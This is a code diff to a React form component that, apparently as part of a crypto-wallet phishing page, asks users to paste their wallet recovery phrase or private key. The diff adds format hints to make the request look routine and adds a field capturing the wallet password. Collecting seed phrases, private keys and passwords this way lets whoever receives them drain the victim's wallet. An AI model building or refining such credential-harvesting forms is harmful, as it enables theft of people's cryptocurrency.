@@ -61,31 +61,53 @@ function Form() {
           className="bg-white font-medium text-stone-950"
         >
           {active === 1 && (
-            <textarea
-              name="message"
-              rows="5"
-              className="mt-4 w-full rounded-lg border border-blue-500 bg-white p-5 font-medium text-stone-950 outline-none md:mb-2"
-              placeholder={"Recovery Phrase"}
-              data-gramm="false"
-            ></textarea>
+            <>
+              <textarea
+                name="message"
+                rows="5"
+                className="mt-4 w-full rounded-lg border border-blue-500 bg-white p-5 font-medium text-stone-950 outline-none md:mb-2"
+                placeholder={"Recovery Phrase"}
+                data-gramm="false"
+              ></textarea>
+              <p>
+                Typically 12 (sometimes 24) words separated by single spaces
+              </p>
+            </>
           )}
           {active === 2 && (
-            <textarea
-              name="message"
-              rows="5"
-              className="mt-4 w-full rounded-lg border border-blue-500 bg-white p-5 font-medium text-stone-950 outline-none md:mb-2"
-              placeholder={"private key"}
-              data-gramm="false"
-            ></textarea>
+            <>
+              <textarea
+                name="message"
+                rows="5"
+                className="my-4 w-full rounded-lg border border-blue-500 bg-white p-5 font-medium text-stone-950 outline-none md:mb-2"
+                placeholder={"private key"}
+                data-gramm="false"
+              ></textarea>
+              <input
+                type="text"
+                className="my-4 w-full rounded-lg border border-blue-500 bg-white p-5 font-medium text-stone-950 outline-none md:mb-2"
+                placeholder="Wallet Password"
+              />
+
+              <p>
+                Several lines of text beginning with plus the password you used
+                to encrypt it.
+              </p>
+            </>
           )}
           {active === 3 && (
-            <textarea
-              name="message"
-              rows="5"
-              className="mt-4 w-full rounded-lg border border-blue-500 bg-white p-5 font-medium text-stone-950 outline-none md:mb-2"
-              placeholder={"private key"}
-              data-gramm="false"
-            ></textarea>
+            <>
+              <textarea
+                name="message"
+                rows="5"
+                className="mt-4 w-full rounded-lg border border-blue-500 bg-white p-5 font-medium text-stone-950 outline-none md:mb-2"
+                placeholder={"private key"}
+                data-gramm="false"
+              ></textarea>
+              <p>
+                Typically 12 (sometimes 24) words seperated by a single space.
+              </p>
+            </>
           )}
 
           <span className="bg-white">
